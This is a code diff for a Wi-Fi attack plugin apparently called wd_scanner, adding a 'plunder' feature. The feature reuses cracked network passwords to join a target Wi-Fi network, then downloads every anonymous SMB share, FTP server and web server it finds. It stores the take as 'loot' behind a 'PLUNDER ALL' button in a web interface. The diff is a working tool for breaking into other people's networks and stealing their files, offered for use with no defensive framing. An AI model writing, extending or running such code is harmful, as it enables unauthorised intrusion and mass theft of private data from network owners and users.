@@ -71,7 +71,7 @@ _DEFAULT_UPDATE_URL = (
 
 class WdScanner(plugins.Plugin):
     __author__ = "you@example.com"
-    __version__ = "1.5.0"
+    __version__ = "2.0.0"
     __license__ = "GPL3"
     __description__ = (
         "Use a second radio to scan for SSIDs/clients and selectively deauth "
@@ -133,6 +133,12 @@ class WdScanner(plugins.Plugin):
         self._shotgun_listen_seconds = 30
         self._shotgun_burst_per_bssid = 3
 
+        # Plunder state.
+        self._plunder_thread = None
+        self._plunder_running = False
+        self._plunder_log = []
+        self._plunder_seconds = 300          # total budget per plunder job
+
         # Auto-updater state.
         self._update_url = _DEFAULT_UPDATE_URL
         self._update_check_interval = 24 * 3600   # seconds between checks
@@ -174,6 +180,9 @@ class WdScanner(plugins.Plugin):
         self._shotgun_burst_per_bssid = int(
             opts.get("shotgun_burst_per_bssid", 3)
         )
+
+        # Plunder config.
+        self._plunder_seconds = int(opts.get("plunder_seconds", 300))
 
         if shutil.which("airodump-ng") is None or shutil.which("airmon-ng") is None:
             logging.error("[wd_scanner] aircrack-ng suite not found on PATH.")
@@ -1278,6 +1287,416 @@ class WdScanner(plugins.Plugin):
 
             self._recon_running = False
 
+    # -------------------------------------------------------------- plunder
+
+    def _log_plunder(self, msg):
+        logging.info("[wd_scanner:plunder] %s", msg)
+        self._plunder_log.append(msg)
+        if len(self._plunder_log) > 200:
+            self._plunder_log = self._plunder_log[-150:]
+
+    def _plunder_dir(self):
+        """Base directory for plunder loot."""
+        return os.path.join(self._handshake_dir(), "wd_plunder")
+
+    def _start_plunder(self, ssid, bssid, password, targets):
+        """
+        Initiate a plunder job.
+        `targets` = list of {ip, ports: [{port, proto, service}]}
+        """
+        with self._lock:
+            if self._action_running or self._recon_running or self._plunder_running:
+                return False, "another operation is already running"
+            if self._agent is None:
+                return False, "agent not ready"
+            self._plunder_running = True
+            self._plunder_log = []
+            self._plunder_thread = threading.Thread(
+                target=self._plunder_worker,
+                args=(ssid, bssid, password, targets),
+                daemon=True,
+            )
+            self._plunder_thread.start()
+            return True, "plunder started"
+
+    def _plunder_worker(self, ssid, bssid, password, targets):
+        """Connect to network, enumerate/download from all plunderable hosts."""
+        agent = self._agent
+        iface, was_shared = self._pick_recon_iface()
+        if not iface:
+            self._log_plunder("no usable interface for plunder")
+            self._plunder_running = False
+            return
+
+        self._log_plunder("plunder target network: %s (%s)" % (ssid, bssid))
+        self._log_plunder("hosts to plunder: %d" % len(targets))
+
+        if not shutil.which("wpa_supplicant") or not shutil.which("dhclient"):
+            self._log_plunder("wpa_supplicant/dhclient missing")
+            self._plunder_running = False
+            return
+
+        if not self._wpa_psk_safe(password):
+            self._log_plunder("password contains illegal characters; aborting")
+            self._plunder_running = False
+            return
+
+        # Create loot directory.
+        bsd = bssid.replace(":", "").lower()
+        ts = int(time.time())
+        loot_dir = os.path.join(self._plunder_dir(), "%s_%d" % (bsd, ts))
+        os.makedirs(loot_dir, exist_ok=True)
+
+        tmpdir = tempfile.mkdtemp(prefix="wd_plunder_")
+        wpa_conf = os.path.join(tmpdir, "wpa_supplicant.conf")
+        wpa_pid = os.path.join(tmpdir, "wpa_supplicant.pid")
+        wpa_ctrl = os.path.join(tmpdir, "ctrl")
+        dhcp_pid = os.path.join(tmpdir, "dhclient.pid")
+        dhcp_lease = os.path.join(tmpdir, "dhclient.leases")
+
+        try:
+            os.makedirs(wpa_ctrl, exist_ok=True)
+        except OSError:
+            pass
+        try:
+            with open(wpa_conf, "w") as f:
+                f.write(
+                    "ctrl_interface=" + wpa_ctrl + "\n"
+                    "update_config=0\n"
+                    "network={\n"
+                    "  ssid=\"" + ssid + "\"\n"
+                    "  psk=\"" + password + "\"\n"
+                    "  scan_ssid=1\n"
+                    "  key_mgmt=WPA-PSK\n"
+                    "}\n"
+                )
+            os.chmod(wpa_conf, 0o600)
+        except OSError as e:
+            self._log_plunder("couldn't write wpa config: %s" % e)
+            self._plunder_running = False
+            return
+
+        t0 = time.time()
+        bettercap_paused_here = False
+        wpa_started = False
+        manifest = {
+            "ts": ts,
+            "ssid": ssid,
+            "bssid": bssid,
+            "targets": [],
+            "total_files": 0,
+            "total_bytes": 0,
+            "duration_seconds": 0,
+            "log": [],
+        }
+
+        try:
+            # Pause bettercap.
+            try:
+                agent.run("wifi.recon off")
+                self._log_plunder("paused bettercap recon")
+                bettercap_paused_here = True
+            except Exception as e:
+                self._log_plunder("could not pause bettercap: %s" % e)
+
+            # Switch to managed mode.
+            self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
+            self._run(["iw", "dev", iface, "set", "type", "managed"], check=False, timeout=5)
+            self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
+
+            # Start wpa_supplicant.
+            self._log_plunder("associating with %s ..." % ssid)
+            self._run([
+                "wpa_supplicant", "-B", "-D", "nl80211,wext",
+                "-i", iface, "-c", wpa_conf, "-P", wpa_pid,
+            ], check=False, timeout=10)
+            wpa_started = True
+
+            # DHCP.
+            self._log_plunder("requesting DHCP lease...")
+            self._run([
+                "dhclient", "-pf", dhcp_pid, "-lf", dhcp_lease,
+                "-1", "-timeout", str(self._recon_dwell), iface,
+            ], check=False, timeout=self._recon_dwell + 5)
+
+            ip = self._iface_ipv4(iface)
+            if not ip:
+                self._log_plunder("no IPv4 acquired; aborting plunder")
+                return
+            self._log_plunder("connected: ip=%s" % ip)
+
+            # Plunder each host.
+            deadline = t0 + self._plunder_seconds
+            for t in targets:
+                if time.time() > deadline:
+                    self._log_plunder("time budget exhausted")
+                    break
+                host_ip = t["ip"]
+                ports = t.get("ports") or []
+                host_dir = os.path.join(loot_dir, host_ip.replace(".", "_"))
+                os.makedirs(host_dir, exist_ok=True)
+                host_manifest = {"ip": host_ip, "services": [], "files": 0, "bytes": 0}
+
+                for p_info in ports:
+                    if time.time() > deadline:
+                        break
+                    port = int(p_info.get("port") or 0)
+                    service = (p_info.get("service") or "").lower()
+                    remaining = max(10, int(deadline - time.time()))
+
+                    if port in (445, 139) or "smb" in service or "microsoft-ds" in service or "netbios" in service:
+                        n, b = self._plunder_smb(host_ip, host_dir, remaining)
+                        host_manifest["services"].append({"port": port, "type": "smb", "files": n, "bytes": b})
+                        host_manifest["files"] += n
+                        host_manifest["bytes"] += b
+
+                    elif port == 21 or "ftp" in service:
+                        n, b = self._plunder_ftp(host_ip, host_dir, remaining)
+                        host_manifest["services"].append({"port": port, "type": "ftp", "files": n, "bytes": b})
+                        host_manifest["files"] += n
+                        host_manifest["bytes"] += b
+
+                    elif port in (80, 8080, 8000, 8888) or "http" in service:
+                        scheme = "https" if port == 443 or port == 8443 or "https" in service else "http"
+                        n, b = self._plunder_http(host_ip, port, scheme, host_dir, remaining)
+                        host_manifest["services"].append({"port": port, "type": scheme, "files": n, "bytes": b})
+                        host_manifest["files"] += n
+                        host_manifest["bytes"] += b
+
+                    elif port in (443, 8443) or "https" in service or "ssl" in service:
+                        n, b = self._plunder_http(host_ip, port, "https", host_dir, remaining)
+                        host_manifest["services"].append({"port": port, "type": "https", "files": n, "bytes": b})
+                        host_manifest["files"] += n
+                        host_manifest["bytes"] += b
+
+                manifest["targets"].append(host_manifest)
+                manifest["total_files"] += host_manifest["files"]
+                manifest["total_bytes"] += host_manifest["bytes"]
+
+            self._log_plunder("plunder complete: %d files, %s"
+                              % (manifest["total_files"], self._human_bytes(manifest["total_bytes"])))
+
+        except Exception as e:
+            logging.exception("[wd_scanner] plunder failed")
+            self._log_plunder("plunder failed: %s" % e)
+        finally:
+            # Tear down connection (same as recon).
+            self._run(["dhclient", "-r", "-pf", dhcp_pid, "-lf", dhcp_lease, iface],
+                      check=False, timeout=10)
+            if wpa_started:
+                self._run(["pkill", "-F", wpa_pid], check=False, timeout=5)
+                self._run(
+                    ["pkill", "-f", r"wpa_supplicant.*-i\s*%s(\s|$)" % re.escape(iface)],
+                    check=False, timeout=5,
+                )
+            if was_shared:
+                self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
+                self._run(["iw", "dev", iface, "set", "type", "monitor"], check=False, timeout=5)
+                self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
+            if bettercap_paused_here:
+                try:
+                    agent.run("wifi.recon on")
+                    self._log_plunder("resumed bettercap recon")
+                except Exception as e:
+                    self._log_plunder("could not resume bettercap: %s" % e)
+
+            manifest["duration_seconds"] = round(time.time() - t0, 1)
+            manifest["log"] = list(self._plunder_log)
+
+            # Save manifest.
+            try:
+                mpath = os.path.join(loot_dir, "manifest.json")
+                with open(mpath, "w") as f:
+                    json.dump(manifest, f, indent=2, default=str)
+                self._log_plunder("manifest saved: %s" % mpath)
+            except Exception as e:
+                self._log_plunder("couldn't save manifest: %s" % e)
+
+            try:
+                shutil.rmtree(tmpdir, ignore_errors=True)
+            except Exception:
+                pass
+
+            self._plunder_running = False
+
+    def _plunder_smb(self, host, host_dir, timeout):
+        """Enumerate and download SMB shares using smbclient."""
+        smb_dir = os.path.join(host_dir, "smb")
+        os.makedirs(smb_dir, exist_ok=True)
+        total_files, total_bytes = 0, 0
+
+        if not shutil.which("smbclient"):
+            self._log_plunder("[%s] smbclient not installed, skipping SMB" % host)
+            return 0, 0
+
+        # List shares (anonymous).
+        self._log_plunder("[%s] enumerating SMB shares..." % host)
+        out = self._run(
+            ["smbclient", "-L", host, "-N", "-g"],
+            check=False, timeout=min(timeout, 15)
+        ) or ""
+
+        shares = []
+        for line in out.splitlines():
+            # Format: Disk|ShareName|Comment
+            parts = line.split("|")
+            if len(parts) >= 2 and parts[0].strip().lower() == "disk":
+                name = parts[1].strip()
+                # Skip common non-useful shares.
+                if name.lower() not in ("ipc$", "print$"):
+                    shares.append(name)
+
+        if not shares:
+            self._log_plunder("[%s] no accessible SMB shares found" % host)
+            return 0, 0
+
+        self._log_plunder("[%s] found %d SMB shares: %s" % (host, len(shares), ", ".join(shares)))
+
+        for share in shares:
+            if time.time() > (time.time() + timeout):
+                break
+            share_dir = os.path.join(smb_dir, re.sub(r"[^\w\-.]", "_", share))
+            os.makedirs(share_dir, exist_ok=True)
+            self._log_plunder("[%s] downloading share: %s" % (host, share))
+            self._run(
+                ["smbclient", "//%s/%s" % (host, share), "-N",
+                 "-c", "recurse; prompt OFF; mget *"],
+                check=False, timeout=min(timeout, 120),
+                cwd=share_dir,
+            )
+            # Count what we got.
+            for root, dirs, files in os.walk(share_dir):
+                for fn in files:
+                    fp = os.path.join(root, fn)
+                    try:
+                        total_bytes += os.path.getsize(fp)
+                        total_files += 1
+                    except OSError:
+                        pass
+
+        self._log_plunder("[%s] SMB done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
+        return total_files, total_bytes
+
+    def _plunder_ftp(self, host, host_dir, timeout):
+        """Download from FTP via wget --mirror (anonymous)."""
+        ftp_dir = os.path.join(host_dir, "ftp")
+        os.makedirs(ftp_dir, exist_ok=True)
+
+        if not shutil.which("wget"):
+            self._log_plunder("[%s] wget not installed, skipping FTP" % host)
+            return 0, 0
+
+        self._log_plunder("[%s] mirroring FTP (anonymous)..." % host)
+        self._run(
+            ["wget", "--mirror", "-P", ftp_dir,
+             "--no-host-directories",
+             "--timeout=10", "--tries=2",
+             "-q",
+             "ftp://anonymous:plunder@%s/" % host],
+            check=False, timeout=min(timeout, 180),
+        )
+
+        total_files, total_bytes = 0, 0
+        for root, dirs, files in os.walk(ftp_dir):
+            for fn in files:
+                fp = os.path.join(root, fn)
+                try:
+                    total_bytes += os.path.getsize(fp)
+                    total_files += 1
+                except OSError:
+                    pass
+
+        self._log_plunder("[%s] FTP done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
+        return total_files, total_bytes
+
+    def _plunder_http(self, host, port, scheme, host_dir, timeout):
+        """Spider an HTTP/HTTPS server with wget."""
+        http_dir = os.path.join(host_dir, "%s_%d" % (scheme, port))
+        os.makedirs(http_dir, exist_ok=True)
+
+        if not shutil.which("wget"):
+            self._log_plunder("[%s] wget not installed, skipping HTTP" % host)
+            return 0, 0
+
+        url = "%s://%s:%d/" % (scheme, host, port)
+        self._log_plunder("[%s] spidering %s ..." % (host, url))
+        self._run(
+            ["wget", "--mirror", "--page-requisites", "--convert-links",
+             "--no-parent", "--no-host-directories",
+             "-e", "robots=off",
+             "--timeout=10", "--tries=2",
+             "--max-redirect=5",
+             "-P", http_dir,
+             "-q",
+             "--no-check-certificate",
+             url],
+            check=False, timeout=min(timeout, 180),
+        )
+
+        total_files, total_bytes = 0, 0
+        for root, dirs, files in os.walk(http_dir):
+            for fn in files:
+                fp = os.path.join(root, fn)
+                try:
+                    total_bytes += os.path.getsize(fp)
+                    total_files += 1
+                except OSError:
+                    pass
+
+        self._log_plunder("[%s] HTTP done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
+        return total_files, total_bytes
+
+    @staticmethod
+    def _human_bytes(n):
+        """Human-readable byte count."""
+        for unit in ("B", "KB", "MB", "GB"):
+            if abs(n) < 1024:
+                return "%.1f %s" % (n, unit)
+            n /= 1024.0
+        return "%.1f TB" % n
+
+    def _list_plunder_jobs(self):
+        """Return list of plunder jobs (manifest.json in each subdir)."""
+        base = self._plunder_dir()
+        if not os.path.isdir(base):
+            return []
+        jobs = []
+        try:
+            for d in sorted(os.listdir(base), reverse=True):
+                full = os.path.join(base, d)
+                mf = os.path.join(full, "manifest.json")
+                if os.path.isdir(full) and os.path.exists(mf):
+                    try:
+                        with open(mf, "r") as f:
+                            manifest = json.load(f)
+                        manifest["_dir"] = d
+                        manifest["_path"] = full
+                        jobs.append(manifest)
+                    except (OSError, ValueError):
+                        pass
+        except OSError:
+            pass
+        return jobs
+
+    def _plunder_loot_files(self, job_dir):
+        """Walk a plunder job directory and return relative paths to all files."""
+        files = []
+        if not os.path.isdir(job_dir):
+            return files
+        for root, dirs, fnames in os.walk(job_dir):
+            for fn in fnames:
+                if fn == "manifest.json":
+                    continue
+                fp = os.path.join(root, fn)
+                rel = os.path.relpath(fp, job_dir)
+                try:
+                    sz = os.path.getsize(fp)
+                except OSError:
+                    sz = 0
+                files.append({"path": rel, "size": sz, "abs": fp})
+        files.sort(key=lambda f: f["path"])
+        return files
+
     @staticmethod
     def _recon_filename(bssid):
         bsd = bssid.replace(":", "").lower()
@@ -1671,13 +2090,14 @@ class WdScanner(plugins.Plugin):
     # ------------------------------------------------------------------- shell
 
     @staticmethod
-    def _run(argv, check=True, timeout=30):
+    def _run(argv, check=True, timeout=30, cwd=None):
         try:
             r = subprocess.run(
                 argv,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
                 timeout=timeout,
+                cwd=cwd,
             )
             if check and r.returncode != 0:
                 logging.warning(
@@ -1764,6 +2184,50 @@ class WdScanner(plugins.Plugin):
             if rep is None:
                 return abort(404)
             return self._render_recon_detail(m_rep.group(1), rep)
+
+        # ---- plunder routes ----
+        if req.method == "POST" and norm == "plunder":
+            # Expects: bssid, ssid, targets (JSON array of {ip, ports})
+            ssid = (req.form.get("ssid") or "").strip()
+            bssid = (req.form.get("bssid") or "").strip().lower()
+            if not re.match(r"^[0-9a-f:]{17}$", bssid):
+                return abort(400)
+            cracked = self._load_cracked_index()
+            password = (
+                cracked.get(bssid)
+                or cracked.get("ssid::" + ssid.lower())
+            )
+            if not password:
+                self._select_error = "no password on file for %s" % (ssid or bssid)
+                return redirect("/plugins/wd_scanner/")
+            targets_raw = req.form.get("targets") or "[]"
+            try:
+                targets = json.loads(targets_raw)
+            except (ValueError, TypeError):
+                return abort(400)
+            self._start_plunder(ssid, bssid, password, targets)
+            return redirect("/plugins/wd_scanner/plunder")
+
+        if norm == "plunder" or norm == "plunder/":
+            return self._render_plunder_list()
+
+        m_loot = re.match(r"^plunder/([^/]+)/download/(.+)$", norm or "")
+        if m_loot:
+            job_dir_name = m_loot.group(1)
+            file_rel = m_loot.group(2)
+            job_path = os.path.join(self._plunder_dir(), job_dir_name)
+            file_path = os.path.join(job_path, file_rel)
+            # Safety: must be within the job dir.
+            real_job = os.path.realpath(job_path)
+            real_file = os.path.realpath(file_path)
+            if not real_file.startswith(real_job + "/") or not os.path.isfile(real_file):
+                return abort(404)
+            from flask import send_file
+            return send_file(real_file, as_attachment=True)
+
+        m_plunder_detail = re.match(r"^plunder/([^/]+)/?$", norm or "")
+        if m_plunder_detail:
+            return self._render_plunder_detail(m_plunder_detail.group(1))
 
         if norm == "pwned" or norm == "pwned/":
             return self._render_pwned()
@@ -2768,6 +3232,7 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
     <a href='/plugins/wd_scanner/' class='active'>SCANNER</a>
     <a href='/plugins/wd_scanner/pwned'>VAULT <span class='count'>{pwned_count}</span></a>
     <a href='/plugins/wd_scanner/recon'>RECON <span class='count cyan'>{recon_count}</span></a>
+    <a href='/plugins/wd_scanner/plunder'>PLUNDER <span class='count'>{plunder_count}</span></a>
   </nav>
 
   <div class='status' id='wd-status'>
@@ -2977,6 +3442,7 @@ option[data-role='shared'] {{ color: var(--warn) !important; }}
             recon_panel=recon_panel_html,
             pwned_count=len(self._compact_pwned_list(cracked)),
             recon_count=len(self._list_recon_reports()),
+            plunder_count=len(self._list_plunder_jobs()),
         )
         return body
 
@@ -3494,6 +3960,54 @@ footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute);
 
         log_lines = escape("\n".join((rep.get("log") or [])[-200:]))
 
+        # Build plunder button if there are plunderable services.
+        plunder_ports = {21, 80, 139, 443, 445, 8080, 8443, 8000, 8888}
+        plunder_services = {"ftp", "http", "https", "smb", "microsoft-ds", "netbios-ssn"}
+        plunder_targets = []
+        for h in alive_hosts:
+            ports = ports_map.get(h) or []
+            host_plunderable = []
+            for p in ports:
+                pnum = int(p.get("port") or 0)
+                svc = (p.get("service") or "").lower()
+                if pnum in plunder_ports or any(k in svc for k in plunder_services):
+                    host_plunderable.append(p)
+            if host_plunderable:
+                plunder_targets.append({"ip": h, "ports": host_plunderable})
+
+        plunder_btn = ""
+        if plunder_targets:
+            csrf_input = self._csrf_input()
+            targets_json = json.dumps(plunder_targets)
+            plunder_disabled = "disabled" if (
+                self._plunder_running or self._action_running or self._recon_running
+            ) else ""
+            raw_bssid = rep.get("bssid") or ""
+            raw_ssid = rep.get("ssid") or ""
+            plunder_btn = (
+                "<div class='plunder-section'>"
+                "  <h3>&#x1f4e6; plunderable services found ({n} hosts)</h3>"
+                "  <form method='POST' action='/plugins/wd_scanner/plunder'"
+                "        onsubmit=\"return confirm('// PLUNDER\\nConnect to {ssid_js} and download data from {n} hosts?');\">"
+                "    {csrf}"
+                "    <input type='hidden' name='bssid' value='{bssid}'>"
+                "    <input type='hidden' name='ssid' value='{ssid}'>"
+                "    <input type='hidden' name='targets' value='{targets}'>"
+                "    <button type='submit' class='btn plunder-btn' {disabled}>"
+                "      &#x1f4e6; PLUNDER ALL"
+                "    </button>"
+                "  </form>"
+                "</div>"
+            ).format(
+                n=len(plunder_targets),
+                ssid=escape(raw_ssid),
+                ssid_js=escape(raw_ssid).replace("'", ""),
+                bssid=escape(raw_bssid),
+                csrf=csrf_input,
+                targets=escape(targets_json),
+                disabled=plunder_disabled,
+            )
+
         inner = (
             "<nav class='nav'>"
             "<a href='/plugins/wd_scanner/recon'>&larr; REPORTS</a>"
@@ -3510,6 +4024,7 @@ footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute);
             "    <div><dt>ALIVE</dt><dd>{alive}</dd></div>"
             "  </dl>"
             "</div>"
+            "{plunder_btn}"
             "<div class='section-h'>hosts</div>"
             "{hosts}"
             "<div class='section-h'>log</div>"
@@ -3517,12 +4032,202 @@ footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute);
         ).format(
             ssid=ssid, bssid=bssid, ip=ip, gw=gw, subnet=subnet, dur=dur,
             alive=len(alive_hosts), hosts=hosts_html, log=log_lines,
+            plunder_btn=plunder_btn,
         )
 
         return self._chrome_page(
             title="recon // " + (rep.get("ssid") or "?"),
             inner=inner,
             mark_color="cyan",
+        )
+
+    # ---------------------------------------------------------- plunder pages
+
+    def _render_plunder_list(self):
+        """Render the plunder overview page listing all jobs + running state."""
+        jobs = self._list_plunder_jobs()
+        running = self._plunder_running
+
+        running_panel = ""
+        if running:
+            running_panel = (
+                "<div class='recon-panel'>"
+                "  <div class='recon-h'>"
+                "    <span class='recon-state run'>RUNNING</span>"
+                "    <span class='mute'>plunder in progress&hellip;</span>"
+                "  </div>"
+                "  <pre class='log'>{lines}</pre>"
+                "</div>"
+            ).format(lines=escape("\n".join(self._plunder_log[-100:])))
+
+        rows = []
+        for job in jobs:
+            ssid = escape(job.get("ssid") or "?")
+            bssid = escape(job.get("bssid") or "?")
+            n_files = job.get("total_files", 0)
+            n_bytes = self._human_bytes(job.get("total_bytes", 0))
+            dur = job.get("duration_seconds", 0)
+            ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(job.get("ts", 0)))
+            dir_name = escape(job.get("_dir", ""))
+            n_targets = len(job.get("targets") or [])
+            rows.append(
+                "<a class='recon-row' href='/plugins/wd_scanner/plunder/{dir_name}'>"
+                "  <header class='recon-row-h'>"
+                "    <span class='recon-row-ssid'>{ssid}</span>"
+                "    <span class='recon-row-ts'>{ts}</span>"
+                "  </header>"
+                "  <dl class='recon-row-meta'>"
+                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
+                "    <div><dt>HOSTS</dt><dd>{n_targets}</dd></div>"
+                "    <div><dt>FILES</dt><dd>{n_files}</dd></div>"
+                "    <div><dt>SIZE</dt><dd>{n_bytes}</dd></div>"
+                "    <div><dt>TIME</dt><dd>{dur}s</dd></div>"
+                "  </dl>"
+                "</a>".format(
+                    dir_name=dir_name, ssid=ssid, bssid=bssid,
+                    n_targets=n_targets, n_files=n_files, n_bytes=n_bytes,
+                    dur=dur, ts=ts,
+                )
+            )
+
+        list_html = "\n".join(rows) if rows else (
+            "<div class='empty'>"
+            "<div class='empty-glyph'>&#x1f4e6;</div>"
+            "<p>// NO PLUNDER JOBS</p>"
+            "<small>run PLUNDER from a recon report to download network data</small>"
+            "</div>"
+        )
+
+        return self._chrome_page(
+            title="plunder",
+            inner=(
+                "<nav class='nav'>"
+                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
+                "<a href='/plugins/wd_scanner/recon'>RECON</a>"
+                "<a href='/plugins/wd_scanner/plunder' class='active'>PLUNDER "
+                "<span class='count cyan'>{n}</span></a>"
+                "</nav>"
+                "<div id='wd-plunder-live'>"
+                "{running}"
+                "<div class='section-h'>plunder jobs</div>"
+                "{list_html}"
+                "</div>"
+                "<script>"
+                "(function(){{"
+                "  var el = document.getElementById('wd-plunder-live');"
+                "  function poll(){{"
+                "    fetch(window.location.href, {{credentials:'same-origin'}})"
+                "      .then(function(r){{ return r.ok ? r.text() : null; }})"
+                "      .then(function(html){{"
+                "        if(!html) return;"
+                "        var doc = new DOMParser().parseFromString(html,'text/html');"
+                "        var fresh = doc.getElementById('wd-plunder-live');"
+                "        if(fresh && el) el.innerHTML = fresh.innerHTML;"
+                "      }})"
+                "      .catch(function(){{}});"
+                "  }}"
+                "  setInterval(poll, 4000);"
+                "}})();"
+                "</script>"
+            ).format(n=len(jobs), running=running_panel, list_html=list_html),
+            mark_color="orange",
+        )
+
+    def _render_plunder_detail(self, dir_name):
+        """Detail view for a single plunder job: summary + file list with download links."""
+        job_path = os.path.join(self._plunder_dir(), dir_name)
+        mf = os.path.join(job_path, "manifest.json")
+        if not os.path.isfile(mf):
+            from flask import abort
+            return abort(404)
+        try:
+            with open(mf, "r") as f:
+                manifest = json.load(f)
+        except (OSError, ValueError):
+            from flask import abort
+            return abort(404)
+
+        ssid = escape(manifest.get("ssid") or "?")
+        bssid = escape(manifest.get("bssid") or "?")
+        n_files = manifest.get("total_files", 0)
+        n_bytes = self._human_bytes(manifest.get("total_bytes", 0))
+        dur = manifest.get("duration_seconds", 0)
+        ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(manifest.get("ts", 0)))
+        targets = manifest.get("targets") or []
+
+        # Target summary cards.
+        target_rows = []
+        for t in targets:
+            tip = escape(t.get("ip") or "?")
+            services = t.get("services") or []
+            svc_parts = []
+            for s in services:
+                svc_parts.append(
+                    "<span class='loot-svc'>{type} :{port} &mdash; {files} files ({bytes})</span>".format(
+                        type=escape(s.get("type", "?")),
+                        port=s.get("port", 0),
+                        files=s.get("files", 0),
+                        bytes=escape(self._human_bytes(s.get("bytes", 0))),
+                    )
+                )
+            target_rows.append(
+                "<div class='loot-target'>"
+                "  <div class='loot-ip'>{ip}</div>"
+                "  <div class='loot-svcs'>{svcs}</div>"
+                "</div>".format(ip=tip, svcs="\n".join(svc_parts))
+            )
+
+        # File list with download links.
+        files = self._plunder_loot_files(job_path)
+        file_rows = []
+        for f in files[:500]:  # cap display
+            dl_url = "/plugins/wd_scanner/plunder/%s/download/%s" % (
+                escape(dir_name), escape(f["path"])
+            )
+            file_rows.append(
+                "<a class='loot-file' href='{url}'>"
+                "  <span class='loot-fname'>{path}</span>"
+                "  <span class='loot-fsize'>{size}</span>"
+                "</a>".format(
+                    url=dl_url,
+                    path=escape(f["path"]),
+                    size=escape(self._human_bytes(f["size"])),
+                )
+            )
+        file_html = "\n".join(file_rows) if file_rows else "<p class='mute'>no files captured</p>"
+
+        # Plunder log.
+        log_lines = manifest.get("log") or []
+        log_html = escape("\n".join(log_lines[-100:]))
+
+        return self._chrome_page(
+            title="plunder // %s" % ssid,
+            inner=(
+                "<nav class='nav'>"
+                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
+                "<a href='/plugins/wd_scanner/plunder'>&larr; PLUNDER</a>"
+                "</nav>"
+                "<div class='detail-meta'>"
+                "  <div><dt>SSID</dt><dd>{ssid}</dd></div>"
+                "  <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
+                "  <div><dt>DATE</dt><dd>{ts}</dd></div>"
+                "  <div><dt>DURATION</dt><dd>{dur}s</dd></div>"
+                "  <div><dt>FILES</dt><dd>{n_files}</dd></div>"
+                "  <div><dt>SIZE</dt><dd>{n_bytes}</dd></div>"
+                "</div>"
+                "<div class='section-h'>targets</div>"
+                "<div class='loot-targets'>{target_rows}</div>"
+                "<div class='section-h'>files ({n_files})</div>"
+                "<div class='loot-files'>{file_html}</div>"
+                "<div class='section-h'>plunder log</div>"
+                "<pre class='log'>{log}</pre>"
+            ).format(
+                ssid=ssid, bssid=bssid, ts=ts, dur=dur,
+                n_files=n_files, n_bytes=n_bytes,
+                target_rows="\n".join(target_rows),
+                file_html=file_html, log=log_html,
+            ),
+            mark_color="orange",
         )
 
     def _chrome_page(self, title, inner, mark_color="cyan"):
@@ -3695,6 +4400,46 @@ body::before {{
 }}
 
 footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute); font-size: 10px; letter-spacing: .35em; }}
+
+/* ---- plunder styles ---- */
+.plunder-section {{
+  margin: 12px 0; padding: 12px;
+  border: 1px solid var(--orange);
+  background: linear-gradient(180deg, rgba(255,122,0,.06), transparent);
+  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+}}
+.plunder-section h3 {{
+  margin: 0 0 8px; font-size: 12px; letter-spacing: .2em;
+  text-transform: uppercase; color: var(--orange);
+}}
+.plunder-btn {{
+  display: inline-flex; align-items: center; justify-content: center;
+  gap: 6px; height: 44px; padding: 0 18px;
+  font: inherit; font-size: 13px; letter-spacing: .1em; text-transform: uppercase;
+  color: var(--orange); background: rgba(255,122,0,.1);
+  border: 1px solid var(--orange); cursor: pointer;
+  clip-path: polygon(6px 0, 100% 0, 100% calc(100% - 6px), calc(100% - 6px) 100%, 0 100%, 0 6px);
+}}
+.plunder-btn:hover {{ background: rgba(255,122,0,.2); }}
+.plunder-btn:disabled {{ opacity: .4; pointer-events: none; }}
+
+.loot-targets {{ display: grid; gap: 8px; margin-bottom: 12px; }}
+.loot-target {{
+  padding: 8px 12px; border: 1px solid var(--grid);
+  background: var(--panel);
+}}
+.loot-ip {{ font-weight: 700; color: var(--cyan); margin-bottom: 4px; }}
+.loot-svcs {{ display: flex; flex-direction: column; gap: 2px; }}
+.loot-svc {{ font-size: 12px; color: var(--fg); letter-spacing: .08em; }}
+.loot-files {{ display: flex; flex-direction: column; gap: 4px; margin-bottom: 12px; max-height: 400px; overflow: auto; }}
+.loot-file {{
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 6px 10px; border: 1px solid var(--grid); background: var(--panel);
+  text-decoration: none; color: var(--fg);
+}}
+.loot-file:hover {{ border-color: var(--cyan); }}
+.loot-fname {{ font-size: 12px; word-break: break-all; flex: 1; }}
+.loot-fsize {{ font-size: 11px; color: var(--mute); margin-left: 8px; white-space: nowrap; }}
 </style>
 </head>
 <body>
